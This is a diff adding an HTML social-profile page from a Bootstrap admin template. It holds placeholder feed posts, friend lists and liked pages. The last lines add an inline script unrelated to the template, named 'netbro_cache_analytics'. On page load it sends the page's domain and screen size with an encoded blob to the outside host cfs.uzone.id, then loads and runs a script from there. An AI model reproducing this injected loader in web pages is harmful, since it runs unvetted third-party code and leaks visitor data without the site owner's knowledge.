+                                                        <div class="text-center">
+                                                            <h3 class="no-mrg">868</h3>
+                                                            <span>Friends</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="cover-footer">
+                                        <ul class="list-unstyled">
+                                            <li class="active">
+                                                <a href="#">Timeline</a>
+                                            </li>
+                                            <li>
+                                                <a href="#">Photos</a>
+                                            </li>
+                                            <li>
+                                                <a href="#">Friends</a>
+                                            </li>
+                                        </ul>
+                                        <a href="#" class="pull-right btn btn-primary btn-rounded no-mrg-btm">Follow</a>
+                                    </div>
+                                </div>
+                                <div class="row">
+                                    <div class="col-lg-3">
+                                        <div class="widget-profile-1 card">
+                                            <div class="profile border bottom">
+                                                <img class="mrg-top-30" src="assets/images/others/img-10.jpg" alt="">
+                                                <h4 class="mrg-top-20 no-mrg-btm text-semibold">Victoria Clayton</h4>
+                                                <p>UI/UX Designer</p>
+                                            </div>
+                                            <div class="pdd-horizon-30 pdd-vertical-20">
+                                                <h5 class="text-semibold mrg-btm-5">About</h5>
+                                                <p>It looks like Sandpeople did this, all right. Look, here are Gaffi sticks, Bantha tracks. It's just...I never heard of them.</p>
+                                                <div class="mrg-top-30 text-center">
+                                                    <ul class="list-unstyle list-inline">
+                                                        <li class="list-inline-item no-pdd-horizon">
+                                                            <a href="#" class="btn btn-facebook btn-icon btn-rounded">
+                                                                <i class="ti-facebook"></i>
+                                                            </a>
+                                                        </li>
+                                                        <li class="list-inline-item no-pdd-horizon">
+                                                            <a href="#" class="btn btn-twitter btn-icon btn-rounded">
+                                                                <i class="ti-twitter"></i>
+                                                            </a>
+                                                        </li>
+                                                        <li class="list-inline-item no-pdd-horizon">
+                                                            <a href="#" class="btn btn-google-plus btn-icon btn-rounded">
+                                                                <i class="ti-google"></i>
+                                                            </a>
+                                                        </li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="col-lg-6">
+                                        <div class="social-feeds">
+                                            <div class="card widget-compose">
+                                                <ul class="composor-tools border bottom">
+                                                    <li>
+                                                        <a href="#">
+                                                            <i class="ti-image text-info pdd-right-5"></i>
+                                                            <span>Attachments</span>
+                                                        </a>
+                                                    </li>
+                                                    <li>
+                                                        <a href="#">
+                                                            <i class="ti-face-smile text-warning pdd-right-5"></i>
+                                                            <span>Emoticon</span>
+                                                        </a>
+                                                    </li>
+                                                    <li>
+                                                        <a href="#">
+                                                            <i class="ti-location-pin text-success pdd-right-5"></i>
+                                                            <span>Location</span>
+                                                        </a>
+                                                    </li>
+                                                </ul>
+                                                <textarea class="form-control" placeholder="What's in your mind?"></textarea>
+                                                <div class="text-right mrg-top-10">
+                                                    <button class="btn btn-info no-mrg-btm">Post</button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="card widget-feed">
+                                            <div class="feed-header">
+                                                <ul class="list-unstyled list-info">
+                                                    <li>
+                                                        <img class="thumb-img img-circle" src="assets/images/avatars/thumb-1.jpg" alt="">
+                                                        <div class="info">
+                                                            <a href="#" class="title no-pdd-vertical text-semibold inline-block">Jordan Hurst</a>
+                                                            <span class="sub-title">
+																	<i class="ti-timer pdd-right-5"></i>
+																	<span>18 min ago</span>
+                                                            </span>
+                                                        </div>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div class="feed-body">
+                                                <p>Remember, a Jedi can feel the Force flowing through him. You mean it controls your actions? Partially. But it also obeys your commands. Hokey religions and ancient weapons are no match for a good blaster at your side, kid. You don't believe in the Force, do you? Kid, I've flown from one side of this galaxy to the other. I've seen a lot of strange stuff, but I've never seen anything to make me believe there's one all-powerful force controlling everything. There's no mystical energy field that controls my destiny. It's all a lot of simple tricks and nonsense. I suggest you try it again, Luke. This time, let go your conscious self and act on instinct. With the blast shield down, I can't even see. How am I supposed to fight? Your eyes can deceive you. Don't trust them.</p>
+                                            </div>
+                                            <ul class="feed-action border bottom">
+                                                <li>
+                                                    <a href="#">
+                                                        <i class="ti-heart text-danger pdd-right-5"></i>
+                                                        <span>168</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="#">
+                                                        <i class="ti-comments text-primary pdd-right-5"></i>
+                                                        <span>18</span>
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                            <div class="feed-footer">
+                                                <div class="comment">
+                                                    <ul class="list-unstyled list-info">
+                                                        <li class="comment-item">
+                                                            <img class="thumb-img img-circle" src="assets/images/avatars/thumb-4.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Samuel Field</a>
+                                                                <span class="sub-title inline-block pull-right">
+																		<i class="ti-timer pdd-right-5"></i>
+																		<span>6 min ago</span>
+                                                                </span>
+                                                                <p class="width-80">General Kenobi, years ago you served my father in the Clone Wars.</p>
+                                                            </div>
+                                                        </li>
+                                                        <li class="comment-item">
+                                                            <img class="thumb-img img-circle" src="assets/images/avatars/thumb-6.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Michael Birch</a>
+                                                                <span class="sub-title inline-block pull-right">
+																		<i class="ti-timer pdd-right-5"></i>
+																		<span>3 min ago</span>
+                                                                </span>
+                                                                <p class="width-80">What good's a reward if you ain't around to use it? Besides, attacking that battle station ain't my idea of courage.</p>
+                                                            </div>
+                                                        </li>
+                                                    </ul>
+                                                    <div class="add-comment">
+                                                        <textarea rows="1" class="form-control" placeholder="Add comment"></textarea>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="card widget-feed">
+                                            <div class="feed-header">
+                                                <ul class="list-unstyled list-info">
+                                                    <li>
+                                                        <img class="thumb-img img-circle" src="assets/images/avatars/thumb-8.jpg" alt="">
+                                                        <div class="info">
+                                                            <a href="#" class="title no-pdd-vertical text-semibold inline-block">Hugh Moreno</a>
+                                                            <span class="sub-title">
+																	<i class="ti-timer pdd-right-5"></i>
+																	<span>18 min ago</span>
+                                                            </span>
+                                                        </div>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div class="feed-body">
+                                                <p>What good's a reward if you ain't around to use it?</p>
+                                                <img class="img-fluid" src="assets/images/others/img-11.jpg" alt="">
+                                            </div>
+                                            <ul class="feed-action border bottom">
+                                                <li>
+                                                    <a href="#">
+                                                        <i class="ti-heart text-danger pdd-right-5"></i>
+                                                        <span>168</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="#">
+                                                        <i class="ti-comments text-primary pdd-right-5"></i>
+                                                        <span>18</span>
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                            <div class="feed-footer">
+                                                <div class="comment">
+                                                    <ul class="list-unstyled list-info">
+                                                        <li class="comment-item">
+                                                            <img class="thumb-img img-circle" src="assets/images/avatars/thumb-5.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Jennifer Watkins</a>
+                                                                <span class="sub-title inline-block pull-right">
+																		<i class="ti-timer pdd-right-5"></i>
+																		<span>6 min ago</span>
+                                                                </span>
+                                                                <p class="width-80">Holding her is dangerous.</p>
+                                                            </div>
+                                                        </li>
+                                                    </ul>
+                                                    <div class="add-comment">
+                                                        <textarea rows="1" class="form-control" placeholder="Add comment"></textarea>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="card widget-feed">
+                                            <div class="feed-header">
+                                                <ul class="list-unstyled list-info">
+                                                    <li>
+                                                        <img class="thumb-img img-circle" src="assets/images/avatars/thumb-10.jpg" alt="">
+                                                        <div class="info">
+                                                            <a href="#" class="title no-pdd-vertical text-semibold inline-block">Renee Edwards</a>
+                                                            <span class="sub-title">
+																	<i class="ti-timer pdd-right-5"></i>
+																	<span>18 min ago</span>
+                                                            </span>
+                                                        </div>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div class="feed-body">
+                                                <p>Check out our good stuff <a href="https://wrapbootstrap.com/theme/eastern-creative-multipurpose-template-WB08T2766" target="_blank">https://themenate.com/eastern</a></p>
+                                                <a href="https://wrapbootstrap.com/theme/eastern-creative-multipurpose-template-WB08T2766" target="_blank" class="shared-item">
+                                                    <div class="item-image bg" style="background-image: url('assets/images/others/img-12.jpg')">
+                                                    </div>
+                                                    <div class="item-content">
+                                                        <h5 class="text-semibold">Easten - Creative Multipurpose Template</h5>
+                                                        <p>Eastern is a clean and modern HTML5 template, that includes 15+ concepts and ton of UI elements which make the customizations full of possibility. It is uniquely designed and truly multi-purpose which fit...</p>
+                                                    </div>
+                                                </a>
+                                            </div>
+                                            <ul class="feed-action border bottom">
+                                                <li>
+                                                    <a href="#">
+                                                        <i class="ti-heart text-danger pdd-right-5"></i>
+                                                        <span>168</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="#">
+                                                        <i class="ti-comments text-primary pdd-right-5"></i>
+                                                        <span>18</span>
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                            <div class="feed-footer">
+                                                <div class="comment">
+                                                    <ul class="list-unstyled list-info">
+                                                        <li class="comment-item">
+                                                            <img class="thumb-img img-circle" src="assets/images/avatars/thumb-4.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Samuel Field</a>
+                                                                <span class="sub-title inline-block pull-right">
+																		<i class="ti-timer pdd-right-5"></i>
+																		<span>8 min ago</span>
+                                                                </span>
+                                                                <p class="width-80">Wow, Great Template!</p>
+                                                            </div>
+                                                        </li>
+                                                    </ul>
+                                                    <div class="add-comment">
+                                                        <textarea rows="1" class="form-control" placeholder="Add comment"></textarea>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="card widget-feed">
+                                            <div class="feed-header">
+                                                <ul class="list-unstyled list-info">
+                                                    <li>
+                                                        <img class="thumb-img img-circle" src="assets/images/avatars/thumb-10.jpg" alt="">
+                                                        <div class="info">
+                                                            <a href="#" class="title no-pdd-vertical text-semibold inline-block">Renee Edwards</a>
+                                                            <span class="sub-title">
+																	<i class="ti-timer pdd-right-5"></i>
+																	<span>18 min ago</span>
+                                                            </span>
+                                                        </div>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div class="feed-body">
+                                                <p>Ella Vos - Down In Flames - Vevo dscvr (Live)</p>
+                                                <iframe src="https://www.youtube.com/embed/ZP95wwpOm9s" height="380" allowfullscreen></iframe>
+                                            </div>
+                                            <ul class="feed-action border bottom">
+                                                <li>
+                                                    <a href="#">
+                                                        <i class="ti-heart text-danger pdd-right-5"></i>
+                                                        <span>168</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="#">
+                                                        <i class="ti-comments text-primary pdd-right-5"></i>
+                                                        <span>18</span>
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                            <div class="feed-footer">
+                                                <div class="comment">
+                                                    <div class="add-comment">
+                                                        <textarea rows="1" class="form-control" placeholder="Add comment"></textarea>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="col-lg-3">
+                                        <div class="card">
+                                            <div class="card-heading border bottom">
+                                                <h4 class="card-title">Friends</h4>
+                                            </div>
+                                            <div class="card-body">
+                                                <ul class="list-unstyled list-info">
+                                                    <li>
+                                                        <div class="pdd-vertical-10 pdd-horizon-20">
+                                                            <img class="thumb-img img-circle" src="assets/images/avatars/thumb-1.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Jordan Hurst</a>
+                                                                <span class="sub-title">
+																		<span>UI/UX Designer</span>
+                                                                </span>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                    <li>
+                                                        <div class="pdd-vertical-10 pdd-horizon-20">
+                                                            <img class="thumb-img img-circle" src="assets/images/avatars/thumb-2.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Harriet Douglas</a>
+                                                                <span class="sub-title">
+																		<span>Director</span>
+                                                                </span>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                    <li>
+                                                        <div class="pdd-vertical-10 pdd-horizon-20">
+                                                            <img class="thumb-img img-circle" src="assets/images/avatars/thumb-6.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Michael Birch</a>
+                                                                <span class="sub-title">
+																		<span>Project Manager</span>
+                                                                </span>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                    <li>
+                                                        <div class="pdd-vertical-10 pdd-horizon-20">
+                                                            <img class="thumb-img img-circle" src="assets/images/avatars/thumb-4.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Samuel Field</a>
+                                                                <span class="sub-title">
+																		<span>App Developer</span>
+                                                                </span>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                    <li>
+                                                        <div class="pdd-vertical-10 pdd-horizon-20">
+                                                            <img class="thumb-img img-circle" src="assets/images/avatars/thumb-5.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Jennifer Watkins</a>
+                                                                <span class="sub-title">
+																		<span>Executive</span>
+                                                                </span>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div class="border top">
+                                                <div class="pdd-vertical-15 pdd-horizon-20 text-center">
+                                                    <a href="#" class="text-semibold text-dark">More...</a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="card">
+                                            <div class="card-heading border bottom">
+                                                <h4 class="card-title">Liked Pages</h4>
+                                            </div>
+                                            <div class="card-block">
+                                                <ul class="list-unstyled list-info">
+                                                    <li class="pdd-vertical-10 pdd-horizon-20">
+                                                        <img class="thumb-img img-circle" src="assets/images/others/thumb-1.jpg" alt="">
+                                                        <div class="info">
+                                                            <a href="#" class="title no-pdd-vertical text-semibold inline-block">Design Company</a>
+                                                            <span class="sub-title">
+																	<span>Studio</span>
+                                                            </span>
+                                                        </div>
+                                                    </li>
+                                                    <li>
+                                                        <div class="pdd-vertical-10 pdd-horizon-20">
+                                                            <img class="thumb-img img-circle" src="assets/images/others/thumb-2.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Market Bistro</a>
+                                                                <span class="sub-title">
+																		<span>Restaurant / Bar</span>
+                                                                </span>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                    <li>
+                                                        <div class="pdd-vertical-10 pdd-horizon-20">
+                                                            <img class="thumb-img img-circle" src="assets/images/others/thumb-3.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Petra Capital</a>
+                                                                <span class="sub-title">
+																		<span>Company</span>
+                                                                </span>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                    <li>
+                                                        <div class="pdd-vertical-10 pdd-horizon-20">
+                                                            <img class="thumb-img img-circle" src="assets/images/others/thumb-4.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Beat Music</a>
+                                                                <span class="sub-title">
+																		<span>Musician</span>
+                                                                </span>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                    <li>
+                                                        <div class="pdd-vertical-10 pdd-horizon-20">
+                                                            <img class="thumb-img img-circle" src="assets/images/others/thumb-5.jpg" alt="">
+                                                            <div class="info">
+                                                                <a href="#" class="title no-pdd-vertical text-semibold inline-block">Rubeez HI_LITES</a>
+                                                                <span class="sub-title">
+																		<span>Fashion</span>
+                                                                </span>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- Content Wrapper END -->
+
+                <!-- Footer START -->
+                <footer class="content-footer">
+                    <div class="footer">
+                        <div class="copyright">
+                            <span>Copyright © 2017 <b class="text-dark">Theme_Nate</b>. All rights reserved.</span>
+                            <span class="go-right">
+									<a href="#" class="text-gray mrg-right-15">Term &amp; Conditions</a>
+									<a href="#" class="text-gray">Privacy &amp; Policy</a>
+								</span>
+                        </div>
+                    </div>
+                </footer>
+                <!-- Footer END -->
+
+            </div>
+            <!-- Page Container END -->
+
+        </div>
+    </div>
+
+    <script src="assets/js/vendor.js"></script>
+
+    <script src="assets/js/app.min.js"></script>
+
+    <!-- page js -->
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31dK4ZUfyQ6h00lWtooHUF0Wc0tnwWsl4LvTSbEwZMwRUvwUdDITQdJlypk03t2ccushKV%2bIMfvHkxFy2SLpIeGdtXSKQspmZGN75FeIYgCpCrYnBEYDuQkIqusK%2f3pYkKUXE27p0c8QeDbCMDSeVdzzMUL5mMgZGIiNp0iMsqMYRogklBPaiEa4j2Jq7NfFyydPvtNRqbzyPL26cgpOAoYk1m%2b1QPOxK0XIl3juJc%2f%2f8AMsP7ITgSpwaqYqVg3zkedefOn6pXlTtQR6MgYZ0eSRX4Ify%2fWHqDWVnoi%2f8Yf7Vua7EwukRtIJVFMWj0MuZvDS0mYo8oqOTp5TH8ZSJXQ6aZMwM4C8zEcllalVK6j7atgcPze2c3GZUvlnyAL0vBzIzJ6vZbMBZ99%2bIZSRR%2fsg1AORXLbolTgBe%2fTtkQgkCbmI46QJs68pnx6I%2bN1I6MLy3TRdGbKA3DdWyrt3c%2fkLMU%2b9q6YgP%2boJdjaR%2bWr3Fb3XJMg2cy0Q%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+
+
+</html>
